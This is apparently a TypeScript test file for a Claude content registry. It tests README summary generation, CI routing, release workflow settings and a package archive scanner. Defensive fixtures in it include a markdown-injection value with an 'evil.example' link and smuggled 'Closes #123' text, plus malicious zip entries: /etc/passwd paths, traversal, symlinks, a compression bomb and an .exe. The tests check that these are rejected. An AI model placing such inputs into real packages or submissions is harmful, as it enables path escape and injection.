        change: {
          changeType: "added",
          category: "mcp",
          slug: "memesio-mcp-server",
          title: "Memesio MCP Server",
        },
        frontmatter: {
          title: "Memesio MCP Server",
          submittedBy: "vy35",
          sourceSubmissionNumber: 325,
        },
        associatedPullRequest: {
          number: 330,
          user: { login: "JSONbored" },
        },
        repository: "JSONbored/awesome-claude",
      }),
    ).toBe(
      "Added [Memesio MCP Server](https://heyclau.de/entry/mcp/memesio-mcp-server) content submission ([#330](https://github.com/JSONbored/awesome-claude/pull/330)) by [@vy35](https://github.com/vy35) via submission #325",
    );

    const body = buildReadmeRefreshBody([
      {
        summary:
          "Added [Xquik MCP Server](https://heyclau.de/entry/mcp/xquik-mcp-server) content submission ([#326](https://github.com/JSONbored/awesome-claude/pull/326)) by [@kriptoburak](https://github.com/kriptoburak)",
      },
      {
        summary:
          "Added [Memesio MCP Server](https://heyclau.de/entry/mcp/memesio-mcp-server) content submission ([#330](https://github.com/JSONbored/awesome-claude/pull/330)) by [@vy35](https://github.com/vy35) via submission #325",
      },
    ]);

    expect(body).toContain(
      "- Added [Xquik MCP Server](https://heyclau.de/entry/mcp/xquik-mcp-server) content submission ([#326](https://github.com/JSONbored/awesome-claude/pull/326)) by [@kriptoburak](https://github.com/kriptoburak)",
    );
    expect(body).toContain(
      "- Added [Memesio MCP Server](https://heyclau.de/entry/mcp/memesio-mcp-server) content submission ([#330](https://github.com/JSONbored/awesome-claude/pull/330)) by [@vy35](https://github.com/vy35) via submission #325",
    );
    expect(body).toContain(
      "pending README changes accumulate in one reviewable PR",
    );
    expect(body).toContain("## Pending content included (2)");
  });

  it("resolves README entries when frontmatter slug differs from filename", async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-readme-"));
    const categoryDir = path.join(tmpDir, "content", "mcp");
    fs.mkdirSync(categoryDir, { recursive: true });
    fs.writeFileSync(
      path.join(categoryDir, "example-file.mdx"),
      `---
title: Example Entry
slug: example
description: Example description
---
`,
      "utf8",
    );

    const resolved = await resolveReadmeEntryChange(
      {
        changeType: "added",
        category: "mcp",
        slug: "example",
        title: "Example Entry",
        description: "Example description",
        key: "mcp/example",
      },
      { repoRoot: tmpDir, repository: "", token: "" },
    );

    expect(resolved.relativePath).toBe("content/mcp/example-file.mdx");
    expect(resolved.summary).toContain(
      "Added [Example Entry](https://heyclau.de/entry/mcp/example) content submission",
    );
  });

  it("uses the add commit for newly added README entries", async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-readme-"));
    git(tmpDir, ["init", "-b", "main"]);
    git(tmpDir, ["config", "user.name", "HeyClaude Test"]);
    git(tmpDir, ["config", "user.email", "test@example.com"]);
    git(tmpDir, ["config", "commit.gpgsign", "false"]);
    git(tmpDir, ["config", "tag.gpgsign", "false"]);

    writeFile(
      path.join(tmpDir, "content", "guides", "example-guide.mdx"),
      `---
title: Example Guide
description: Example description
---
`,
    );
    git(tmpDir, ["add", "."]);
    git(tmpDir, ["commit", "-m", "test: add guide"]);
    const addCommit = git(tmpDir, ["rev-parse", "HEAD"]);

    fs.appendFileSync(
      path.join(tmpDir, "content", "guides", "example-guide.mdx"),
      "\nUpdated content.\n",
      "utf8",
    );
    git(tmpDir, ["add", "."]);
    git(tmpDir, ["commit", "-m", "test: update guide"]);
    const updateCommit = git(tmpDir, ["rev-parse", "HEAD"]);

    const added = await resolveReadmeEntryChange(
      {
        changeType: "added",
        category: "guides",
        slug: "example-guide",
        title: "Example Guide",
        description: "Example description",
        key: "guides/example-guide",
      },
      { repoRoot: tmpDir, repository: "", token: "" },
    );
    const updated = await resolveReadmeEntryChange(
      {
        changeType: "updated",
        category: "guides",
        slug: "example-guide",
        title: "Example Guide",
        description: "Example description",
        key: "guides/example-guide",
      },
      { repoRoot: tmpDir, repository: "", token: "" },
    );

    expect(added.commitSha).toBe(addCommit);
    expect(updated.commitSha).toBe(updateCommit);
  });

  it("fails when added README catalog lines are not parseable", async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-readme-"));
    writeFile(
      path.join(tmpDir, "readme.diff"),
      `
diff --git a/README.md b/README.md
@@ -1,2 +1,3 @@
+- **[Future Entry](https://heyclau.de/catalog/guides/future-entry)** - Parser should not silently ignore this.
`,
    );

    await expect(
      buildReadmeRefreshBodyMain([
        "--repo-root",
        tmpDir,
        "--diff-file",
        "readme.diff",
        "--output",
        "body.md",
      ]),
    ).rejects.toThrow(
      /1 added catalog entry line\(s\), but 0 parsed change\(s\)/,
    );
  });

  it("fails when README catalog extraction misses only some added lines", async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-readme-"));
    writeFile(
      path.join(tmpDir, "readme.diff"),
      `
diff --git a/README.md b/README.md
@@ -1,2 +1,4 @@
+- **[Valid Entry](https://heyclau.de/entry/guides/valid-entry)** - Parser should find this entry.
+- **[Future Entry](https://heyclau.de/catalog/guides/future-entry)** - Parser should not silently ignore this.
`,
    );

    await expect(
      buildReadmeRefreshBodyMain([
        "--repo-root",
        tmpDir,
        "--diff-file",
        "readme.diff",
        "--output",
        "body.md",
      ]),
    ).rejects.toThrow(
      /2 added catalog entry line\(s\), but 1 parsed change\(s\)/,
    );
  });

  it("omits invalid submittedBy markdown from README refresh bodies", () => {
    const summary = summarizeReadmeEntryChange({
      change: {
        changeType: "added",
        title: "Injected [Title](https://evil.example)",
      },
      frontmatter: {
        title: "Injected [Title](https://evil.example)",
        submittedBy: "attacker\n\nCloses #123\n@octo-org/security-team",
        sourceSubmissionNumber: 77,
        importPrNumber: 88,
      },
      associatedPullRequest: {
        number: 88,
        user: { login: "JSONbored" },
      },
    });

    expect(summary).toBe(
      "Added Injected \\[Title\\]\\(https://evil\\.example\\) content submission (#88) via submission #77",
    );
    expect(summary).not.toContain("Closes #123");
    expect(summary).not.toContain("@octo-org/security-team");
    expect(summary).not.toContain("by @");
  });

  it("moves submission queue context into the private gate docs", () => {
    expect(
      fs.existsSync(
        path.join(repoRoot, ".github/workflows/submission-queue.yml"),
      ),
    ).toBe(false);

    const source = fs.readFileSync(
      path.join(repoRoot, "docs/submission-queue-ops.md"),
      "utf8",
    );

    expect(source).toContain("source of truth");
    expect(source).toContain("safety");
    expect(source).toContain("provenance");
    expect(source).toContain("duplicates");
    expect(source).toContain("generated-artifact");
    expect(source).toContain("Review Fallback Checklist");
    expect(source).toContain("CodeRabbit is skipped");
    expect(source).toContain("gate-comment-v5");
    expect(source).toContain("Gittensory as advisory context");
    expect(source).toContain("no-issue rationale");
    expect(source).toContain("deterministic source hash");
  });

  it("documents registry endpoint review as a separate contract checklist", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, "docs/api-security-contract.md"),
      "utf8",
    );

    expect(source).toContain("Registry Endpoint Change Checklist");
    expect(source).toContain("apps/web/src/routes/api/**");
    expect(source).toContain("apps/web/src/lib/api/contracts.ts");
    expect(source).toContain("origin-check setting");
    expect(source).toContain("rate-limit scope");
    expect(source).toContain("tests/api-contracts.test.ts");
    expect(source).toContain("pnpm validate:openapi");
    expect(source).toContain("maintainer-lane no-issue rationale");
  });

  it("removes stale issue automation from public workflows", () => {
    expect(
      fs.existsSync(
        path.join(repoRoot, ".github/workflows/submission-stale.yml"),
      ),
    ).toBe(false);
  });

  it("prevents Renovate from pinning package engine ranges", () => {
    const renovate = JSON.parse(
      fs.readFileSync(path.join(repoRoot, "renovate.json"), "utf8"),
    );
    const packageJson = JSON.parse(
      fs.readFileSync(path.join(repoRoot, "packages/mcp/package.json"), "utf8"),
    );

    expect(packageJson.engines.node).toBe(">=20");
    expect(renovate.packageRules).toContainEqual(
      expect.objectContaining({
        matchManagers: ["npm"],
        matchDepTypes: ["engines"],
        enabled: false,
      }),
    );
    expect(renovate.packageRules).toContainEqual(
      expect.objectContaining({
        matchManagers: ["github-actions"],
        matchDepNames: ["node"],
        allowedVersions: "24.x",
      }),
    );
  });

  it("keeps required validation classification wired for README and changelog PRs", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, "scripts/ci/classify-pr-changes.mjs"),
      "utf8",
    );

    expect(source).toContain('"README.md"');
    expect(source).toContain("/^.*\\.md$/");
    expect(source).toContain("CONTENT_CATEGORIES");
    expect(source).toContain("content_categories_json");
  });

  it("routes hook-only content PRs to hook content, direct submission, and registry validation", () => {
    const outputs = runClassifierForChangedFiles({
      "content/hooks/retro-daily.mdx": "---\ntitle: Retro Daily\n---\n",
    });

    expect(outputs.content).toBe("true");
    expect(outputs.content_hooks).toBe("true");
    expect(outputs.content_mcp).toBe("false");
    expect(outputs.content_categories_json).toBe('["hooks"]');
    expect(outputs.direct_submission).toBe("true");
    expect(outputs.web).toBe("false");
    expect(outputs.mcp).toBe("false");
    expect(outputs.raycast).toBe("false");
    expect(outputs.packages).toBe("false");
    expect(outputs.registry).toBe("true");
    expect(outputs.ci).toBe("false");
  });

  it("routes multi-category content PRs to touched category and artifact validators", () => {
    const outputs = runClassifierForChangedFiles({
      "content/hooks/retro-daily.mdx": "---\ntitle: Retro Daily\n---\n",
      "content/mcp/example-server.mdx": "---\ntitle: Example Server\n---\n",
    });

    expect(outputs.content_categories_json).toBe('["hooks","mcp"]');
    expect(outputs.content_hooks).toBe("true");
    expect(outputs.content_mcp).toBe("true");
    expect(outputs.content_skills).toBe("false");
    expect(outputs.web).toBe("true");
    expect(outputs.raycast).toBe("true");
    expect(outputs.packages).toBe("false");
    expect(outputs.registry).toBe("true");
  });

  it("routes generated registry artifacts to artifact validation", () => {
    const outputs = runClassifierForChangedFiles({
      "apps/web/public/data/raycast/entries.json": "[]\n",
    });

    expect(outputs.content).toBe("false");
    expect(outputs.registry).toBe("true");
    expect(outputs.web).toBe("true");
    expect(outputs.raycast).toBe("true");
    expect(outputs.packages).toBe("false");
  });

  it("does not document GitHub PATs in MCP process arguments", () => {
    const source = fs.readFileSync(
      path.join(
        repoRoot,
        "content/agents/claude-mcp-skills-integration-agent.mdx",
      ),
      "utf8",
    );

    expect(source).not.toContain('"args": ["--token", "${GITHUB_TOKEN}"]');
    expect(source).toContain('"GITHUB_TOKEN": "${GITHUB_TOKEN}"');
  });

  it("disables Renovate lock-file maintenance PRs", () => {
    const renovate = JSON.parse(
      fs.readFileSync(path.join(repoRoot, "renovate.json"), "utf8"),
    );

    expect(renovate.lockFileMaintenance).toMatchObject({
      enabled: false,
    });
  });

  it("uses package-scoped MCP releases and keeps shell-consumed outputs in env", () => {
    const releaseSource = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/publish-mcp-npm.yml"),
      "utf8",
    );
    const releaseValidatorSource = fs.readFileSync(
      path.join(repoRoot, "scripts/validate-mcp-release.sh"),
      "utf8",
    );
    const packageSource = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/mcp-package.yml"),
      "utf8",
    );
    const jobsSource = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/jobs-source-revalidation.yml"),
      "utf8",
    );

    expect(releaseSource).toContain("group: mcp-package-release");
    expect(releaseSource).toContain("validate-mcp-npm:");
    expect(releaseSource).toContain("publish-mcp-npm:");
    expect(releaseSource).toContain("needs: validate-mcp-npm");
    expect(releaseSource).toContain("permissions:\n  contents: read");
    expect(releaseSource).toContain("id-token: write");
    expect(releaseSource).toContain("environment: npm-production");
    expect(releaseSource).toContain("persist-credentials: false");
    expect(releaseSource).toContain(
      "pnpm install --frozen-lockfile --ignore-scripts",
    );
    expect(
      releaseSource.match(/bash scripts\/validate-mcp-release\.sh/g),
    ).toHaveLength(2);
    expect(releaseSource).not.toContain("NODE_AUTH_TOKEN");
    expect(releaseSource).not.toContain("NPM_TOKEN");
    expect(releaseSource).not.toContain("x-access-token");
    expect(releaseSource).not.toContain("AUTHORIZATION: bearer");
    expect(releaseSource).toContain("gh auth setup-git");
    expect(releaseValidatorSource).toContain(
      "require('./packages/mcp/package.json').version",
    );
    expect(releaseValidatorSource).toContain(
      'release_tag="mcp-v$release_version"',
    );
    expect(releaseValidatorSource).toContain('echo "version=$release_version"');
    expect(releaseValidatorSource).toContain('echo "tag=$release_tag"');
    expect(releaseSource).toContain(
      "npm publish --access public --provenance --ignore-scripts",
    );
    expect(packageSource).toContain("MCP_PACKAGE_REMOTE_SMOKE_URL");
    expect(packageSource).toContain(
      "pnpm --filter @heyclaude/mcp pack --dry-run --json",
    );
    expect(jobsSource).toContain(
      "SOURCE_BASE_URL: ${{ steps.source-check.outputs.base-url }}",
    );
    expect(jobsSource).toContain('args=(--base-url "$SOURCE_BASE_URL"');
    expect(jobsSource).toContain('} >> "$GITHUB_OUTPUT"');
    expect(jobsSource).not.toContain('echo "skip=true"');
    expect(jobsSource).not.toContain(
      "Skipping scheduled jobs source revalidation",
    );
    expect(jobsSource).toContain(
      "Scheduled source revalidation must fail visibly",
    );
    expect(jobsSource).toContain(
      "if: steps.source-check.outputs.skip != 'true'",
    );
  });
});

describe("package archive scanner regression fixtures", () => {
  const SCAN_SCRIPT = "scripts/scan-download-packages.mjs";
  const VALIDATE_SCRIPT = "scripts/validate-download-packages.mjs";

  // A SKILL.md whose frontmatter satisfies the validator (name + description).
  const VALID_SKILL_MD =
    "---\nname: example-skill\ndescription: Example skill description.\n---\n\nDo the thing.\n";

  const verifiedSkillMdx = mdx(`
title: Example Skill
slug: example-skill
category: skills
description: Example source-backed skill.
submittedBy: maintainer
submittedByUrl: https://github.com/maintainer
downloadUrl: /downloads/skills/example-skill.zip
packageVerified: true
`);

  const verifiedMcpMdx = mdx(`
title: Example MCP Server
slug: example-server
category: mcp
description: Example source-backed MCP server.
submittedBy: maintainer
submittedByUrl: https://github.com/maintainer
downloadUrl: /downloads/mcp/example-server.mcpb
packageVerified: true
`);

  const requiredMcpFiles = [
    { name: "manifest.json", content: "{}" },
    { name: "package.json", content: '{"name":"example-server"}' },
    { name: "README.md", content: "# Example MCP Server\n" },
    { name: "server/index.js", content: "module.exports = {};\n" },
  ];

  function mdx(frontmatter: string): string {
    return `---\n${frontmatter.trim()}\n---\n\nSource-backed package.\n`;
  }

  function runPackageScript(
    script: string,
    files: Record<string, Buffer | string>,
  ): { status: number | null; stdout: string; stderr: string } {
    const tmpDir = fs.mkdtempSync(
      path.join(os.tmpdir(), "heyclaude-package-fixture-"),
    );
    try {
      for (const [relativePath, data] of Object.entries(files)) {
        const target = path.join(tmpDir, relativePath);
        fs.mkdirSync(path.dirname(target), { recursive: true });
        fs.writeFileSync(target, data);
      }
      const result = spawnSync(
        process.execPath,
        [path.join(repoRoot, script)],
        { cwd: tmpDir, encoding: "utf8" },
      );
      return {
        status: result.status,
        stdout: result.stdout ?? "",
        stderr: result.stderr ?? "",
      };
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  }

  const runScanner = (files: Record<string, Buffer | string>) =>
    runPackageScript(SCAN_SCRIPT, files);
  const runValidator = (files: Record<string, Buffer | string>) =>
    runPackageScript(VALIDATE_SCRIPT, files);

  it("scanner rejects absolute archive paths", () => {
    const result = runScanner({
      "content/skills/unsafe.zip": buildZip([
        { name: "/etc/passwd", content: "root:x:0:0" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("unsafe archive path (/etc/passwd)");
  });

  it("scanner rejects parent-directory traversal paths", () => {
    const result = runScanner({
      "content/skills/unsafe.zip": buildZip([
        { name: "../escape.txt", content: "payload" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("unsafe archive path (../escape.txt)");
  });

  it("scanner rejects backslash archive paths", () => {
    const result = runScanner({
      "content/skills/unsafe.zip": buildZip([
        { name: "windows\\payload.txt", content: "payload" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "unsafe archive path (windows\\payload.txt)",
    );
  });

  it("scanner rejects symlink entries", () => {
    const result = runScanner({
      "content/skills/symlink.zip": buildZip([
        { name: "example-skill/link", symlinkTarget: "/etc/passwd" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("symbolic links are not allowed");
  });

  it("scanner rejects nested archives", () => {
    const result = runScanner({
      "content/skills/nested.zip": buildZip([
        { name: "example-skill/inner.zip", content: "not really a zip" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "nested archive is not allowed (example-skill/inner.zip)",
    );
  });

  it("scanner rejects executable package files", () => {
    const result = runScanner({
      "content/skills/exe.zip": buildZip([
        { name: "example-skill/installer.exe", content: "MZ" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "executable package file is not allowed (example-skill/installer.exe)",
    );
  });

  it("scanner warns about script files without failing the scan", () => {
    const result = runScanner({
      "content/skills/script.zip": buildZip([
        { name: "example-skill/SKILL.md", content: VALID_SKILL_MD },
        { name: "example-skill/scripts/setup.sh", content: "echo hi\n" },
      ]),
    });

    expect(result.status).toBe(0);
    expect(result.stdout).toContain(
      "script file requires source review (example-skill/scripts/setup.sh)",
    );
  });

  it("scanner rejects archives that exceed the compression ratio limit", () => {
    const result = runScanner({
      "content/skills/bomb.zip": buildZip([
        {
          name: "example-skill/zeros.bin",
          content: Buffer.alloc(1024 * 1024, 0),
          compression: "deflate",
        },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("compression ratio exceeds 30:1");
  });

  it("scanner rejects archives with too many files", () => {
    const entries = Array.from({ length: 501 }, (_, index) => ({
      name: `example-skill/file-${index}.txt`,
      content: "x",
    }));
    const result = runScanner({
      "content/skills/many.zip": buildZip(entries),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("archive contains more than 500 files");
  });

  it("scanner fails closed on corrupt archives", () => {
    const result = runScanner({
      "content/skills/corrupt.zip": Buffer.from("not a zip"),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("cannot inspect archive");
  });

  it("scanner accepts a clean skill archive", () => {
    const result = runScanner({
      "content/skills/clean.zip": buildZip([
        { name: "example-skill/SKILL.md", content: VALID_SKILL_MD },
        { name: "example-skill/references/guide.md", content: "Reference.\n" },
      ]),
    });

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Package artifact scan passed");
  });

  it("validator rejects skill archives missing SKILL.md", () => {
    const result = runValidator({
      "content/skills/example-skill.mdx": verifiedSkillMdx,
      "content/skills/example-skill.zip": buildZip([
        { name: "example-skill/notes.md", content: "no skill manifest" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "skills archive must include example-skill/SKILL.md",
    );
  });

  it("validator rejects skill archives with unexpected files", () => {
    const result = runValidator({
      "content/skills/example-skill.mdx": verifiedSkillMdx,
      "content/skills/example-skill.zip": buildZip([
        { name: "example-skill/SKILL.md", content: VALID_SKILL_MD },
        { name: "example-skill/payload.bin", content: "binary blob" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "unexpected Agent Skill file (example-skill/payload.bin)",
    );
  });

  it("validator rejects skill archives with multiple root folders", () => {
    const result = runValidator({
      "content/skills/example-skill.mdx": verifiedSkillMdx,
      "content/skills/example-skill.zip": buildZip([
        { name: "example-skill/SKILL.md", content: VALID_SKILL_MD },
        { name: "second-skill/SKILL.md", content: VALID_SKILL_MD },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "skills archive must contain one root folder",
    );
  });

  it("validator rejects unsafe paths inside skill archives", () => {
    const result = runValidator({
      "content/skills/example-skill.mdx": verifiedSkillMdx,
      "content/skills/example-skill.zip": buildZip([
        { name: "example-skill/SKILL.md", content: VALID_SKILL_MD },
        { name: "example-skill/../escape.md", content: "payload" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("unsafe archive path detected");
  });

  it("validator rejects MCPB archives missing required files", () => {
    const result = runValidator({
      "content/mcp/example-server.mdx": verifiedMcpMdx,
      "content/mcp/example-server.mcpb": buildZip([
        { name: "manifest.json", content: "{}" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain("missing required MCPB file");
  });

  it("validator rejects MCPB archives with disallowed file extensions", () => {
    const result = runValidator({
      "content/mcp/example-server.mdx": verifiedMcpMdx,
      "content/mcp/example-server.mcpb": buildZip([
        ...requiredMcpFiles,
        { name: "payload.exe", content: "MZ" },
      ]),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "unexpected MCPB file extension (payload.exe)",
    );
  });

  it("validator rejects local /downloads references without packageVerified", () => {
    const result = runValidator({
      "content/skills/example-skill.mdx": mdx(`
title: Example Skill
slug: example-skill
category: skills
description: Example source-backed skill.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
downloadUrl: /downloads/skills/example-skill.zip
`),
    });

    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "local /downloads hosting requires packageVerified: true",
    );
  });

  it("validator accepts verified skill and MCPB archives", () => {
    const result = runValidator({
      "content/skills/example-skill.mdx": verifiedSkillMdx,
      "content/skills/example-skill.zip": buildZip([
        { name: "example-skill/SKILL.md", content: VALID_SKILL_MD },
        { name: "example-skill/scripts/run.py", content: "print('hi')\n" },
      ]),
      "content/mcp/example-server.mdx": verifiedMcpMdx,
      "content/mcp/example-server.mcpb": buildZip(requiredMcpFiles),
    });

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Package download validation passed.");
  });
});
